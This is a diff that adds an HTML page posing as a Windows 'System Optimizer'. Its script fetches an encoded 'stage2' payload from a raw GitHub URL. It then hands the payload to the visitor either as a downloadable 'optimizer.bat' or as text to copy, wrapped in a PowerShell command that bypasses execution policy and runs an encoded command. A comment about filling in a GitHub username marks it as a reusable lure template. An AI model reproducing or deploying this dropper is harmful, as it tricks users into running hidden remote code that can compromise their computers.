@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>System Tools</title>
+    <meta charset="UTF-8">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: system-ui;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .card {
+            background: white;
+            padding: 50px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 500px;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        p {
+            color: #666;
+            margin-bottom: 30px;
+        }
+
+        .btn {
+            padding: 15px 40px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        textarea {
+            width: 100%;
+            height: 150px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: monospace;
+            font-size: 11px;
+        }
+
+        .instructions {
+            background: #fff3cd;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 15px;
+            text-align: left;
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="card">
+        <div style="font-size: 64px; margin-bottom: 20px;">⚡</div>
+        <h1>System Optimizer</h1>
+        <p>Enhance your Windows system performance</p>
+
+        <button class="btn" onclick="showAuto()">📥 Auto Download</button>
+        <button class="btn" onclick="showManual()">📋 Manual Copy</button>
+
+        <div id="content"></div>
+    </div>
+
+    <script>
+        // UPDATE THIS WITH YOUR GITHUB USERNAME!
+        const GITHUB_USER = 'icecold169';
+        const GITHUB_REPO = 'rtcp';
+        const RAW_URL = `https://raw.githubusercontent.com/icecold169/readme/refs/heads/main/stage2.txt`;
+
+        let payload = null;
+
+        async function loadPayload() {
+            if (payload) return;
+            try {
+                const res = await fetch(RAW_URL);
+                payload = await res.text();
+            } catch (e) {
+                alert('Error loading payload. Check your internet connection.');
+            }
+        }
+
+        loadPayload();
+
+        function showAuto() {
+            document.getElementById('content').innerHTML = `
+            <div style="margin-top: 30px;">
+                <h3>Auto Download</h3>
+                <button class="btn" onclick="download()">Download</button>
+            </div>
+        `;
+        }
+
+        function showManual() {
+            document.getElementById('content').innerHTML = `
+            <div style="margin-top: 30px;">
+                <h3>Manual Copy</h3>
+                <textarea id="code" readonly onclick="this.select()">Loading...</textarea>
+                <button class="btn" onclick="copy()">Copy</button>
+            </div>
+        `;
+            generateCode();
+        }
+
+        async function generateCode() {
+            if (!payload) await loadPayload();
+            if (!payload) {
+                document.getElementById('code').value = 'ERROR: Cannot load';
+                return;
+            }
+
+            document.getElementById('code').value = `@echo off
+                powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${payload}
+                exit /b`;
+        }
+
+        async function download() {
+            const status = document.getElementById('status');
+            if (!payload) {
+                status.innerHTML = '<div style="color: red;">Loading...</div>';
+                await loadPayload();
+            }
+
+            if (!payload) {
+                status.innerHTML = '<div style="color: red;">Error: Cannot load</div>';
+                return;
+            }
+
+            const bat = `@echo off
+                powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${payload}
+                exit /b`;
+
+            const blob = new Blob([bat], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'optimizer.bat';
+            a.click();
+            URL.revokeObjectURL(url);
+
+            status.innerHTML = '<div style="color: green; margin-top: 15px;">✓ Downloaded!</div>';
+        }
+
+        function copy() {
+            const textarea = document.getElementById('code');
+            textarea.select();
+            document.execCommand('copy');
+            alert('✓ Copied to clipboard! Now paste into Notepad.');
+        }
+    </script>
+</body>
+
+</html>
